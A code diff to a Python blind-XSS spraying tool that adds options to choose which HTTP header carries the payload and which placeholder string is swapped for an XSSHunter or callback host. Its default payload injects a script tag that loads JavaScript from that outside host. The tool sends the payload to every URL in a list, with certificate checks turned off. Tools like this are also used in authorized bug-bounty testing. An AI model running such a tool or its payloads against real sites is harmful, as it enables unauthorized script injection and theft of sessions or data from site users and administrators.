@@ -21,7 +21,9 @@ def Validation(Options):
         "bin":"",
         "mode":"",
         "payload":"",
-        "redirection":""
+        "redirection":"",
+        "header":"",
+        "replace":""
     }
 
     # File Validation
@@ -46,15 +48,21 @@ def Validation(Options):
         else:
             Config["bin"] = Options.bin
 
+    # Replace Validation Before Payload.
+    if Options.replace != None:
+        Config["replace"] = Options.replace
+    else:
+        Config["replace"] = "XXX" 
+
     # Payload Validation
     if Options.payload != None:
         # The User Selected a Payload
-        if "XXX" not in Options.payload:
+        if Config["replace"] not in Options.payload:
             print("You didn't add the replace string. use 'XXX' with your payload to replace it with the XSSHunter/Bin"); exit()
         else:
             Config["payload"] = Options.payload
     else:
-        Config["payload"] = '"><script src=XXX></script>'
+        Config["payload"] = f'"><script src={Config["replace"]}></script>'
 
     # Redirection Validation
     if Options.redirect != None:
@@ -65,17 +73,22 @@ def Validation(Options):
     else:
         Config["redirect"] = "allow"
 
+    if Options.header != None:
+        Config["header"] = Options.header
+    else:
+        Config["header"] = "User-Agent"
+
     return Config
 
-def Sender(URL , Redirect , Payload , Hunter):
-    Payload = Payload.replace("XXX" , Hunter)
+def Sender(URL , Redirect , Payload , Hunter , Header , Replace):
+    Payload = Payload.replace(Replace , Hunter)
 
     try:
         if Redirect == "allow":
-            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=True)
+            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=True)
             print("\rRequest Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
         else:
-            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=False)
+            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=False)
             print("Request Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
     except Exception:
         print("Can't Request This URL: {0}".format(URL))
@@ -88,6 +101,8 @@ def CollectOptions():
     Parser.add_option("-b" , "--bin" , dest="bin" , help="Your External Bin You Want To Use To Detect If The Payload Is Fired")
     Parser.add_option("-r" , "--redirections" , dest="redirect" , help="Redirection Mode To Allow/Disallow Them")
     Parser.add_option("-s" , "--strip" , dest="strip" , help="The Payload Seprator To Split Them.")
+    Parser.add_option("--replace" , dest="replace" , help="The String Used To Replace It With The Host")
+    Parser.add_option("--header" , dest="header" , help="The Header You Want The Blind Payload To Be Added On.")
 
     Options , _ = Parser.parse_args()
     return Options
@@ -115,10 +130,10 @@ def Main(Options):
         URL = URL.rstrip("\n")
 
         if _mode == 1:
-            Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter)
+            Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
         elif _mode == 0:
             for SinglePayload in Payloads:
-                Sender(URL=URL , Redirect=Config["redirection"] , Payload=SinglePayload , Hunter=Hunter)
+                Sender(URL=URL , Redirect=Config["redirection"] , Payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
         else:
             pass
 
